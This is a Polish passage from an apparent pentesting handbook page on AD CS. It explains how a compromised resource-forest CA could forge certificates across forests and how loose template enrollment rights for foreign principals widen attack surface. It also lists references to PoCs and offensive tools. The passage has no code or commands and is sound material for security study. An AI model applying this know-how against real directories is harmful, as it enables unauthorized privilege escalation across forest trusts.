Konfiguracja **cross-forest enrollment** jest stosunkowo prosta. **Certyfikat root CA** z resource forest jest **publikowany w account forests** przez administratorów, a certyfikaty **enterprise CA** z resource forest są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym account forest**. Wyjaśniając, takie rozwiązanie zapewnia **CA w resource forest pełną kontrolę** nad wszystkimi innymi lasami, dla których zarządza PKI. Jeżeli to CA zostanie **skompromitowane przez attackerów**, certyfikaty dla wszystkich użytkowników zarówno w resource forest, jak i account forests mogą zostać przez nich **sfałszowane**, co prowadzi do złamania granicy bezpieczeństwa lasu.<sup>[[6]](#references)</sup>

### Uprawnienia enrollment przyznane foreign principals

W środowiskach multi-forest należy zachować ostrożność w odniesieniu do Enterprise CA, które **publikują certificate templates** zezwalające **Authenticated Users lub foreign principals** (użytkownikom/grupom zewnętrznym wobec lasu, do którego należy Enterprise CA) na **enrollment i prawa edycji**.\
Po uwierzytelnieniu przez trust identyfikator SID **Authenticated Users** jest dodawany przez AD do tokenu użytkownika. W związku z tym, jeśli domena posiada Enterprise CA z template, który **zezwala Authenticated Users na prawa enrollment**, użytkownik z innego lasu może potencjalnie **wykonać enrollment w takim template**. Podobnie, jeśli **prawa enrollment zostaną jawnie przyznane foreign principal przez template**, utworzona zostaje **cross-forest relacja kontroli dostępu**, umożliwiająca principalowi z jednego lasu **wykonanie enrollment w template z innego lasu**.

Oba scenariusze prowadzą do **zwiększenia attack surface** z jednego lasu na drugi. Ustawienia certificate template mogą zostać wykorzystane przez attackera do uzyskania dodatkowych uprawnień w foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [repozytorium PoC aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - analiza techniczna Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: wykorzystywanie Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nowe metody uwierzytelniania i żądań oraz więcej](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: wykorzystywanie mapowania kont Key Trust do przejęcia konta](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – historia Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying do AD Certificate Services przez RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: dostęp shell do CA ADCS z YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – technika nadużycia ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – technika nadużycia ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – eskalacja uprawnień (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: nie tylko kolejny AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: błędna konfiguracja i wykorzystanie](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
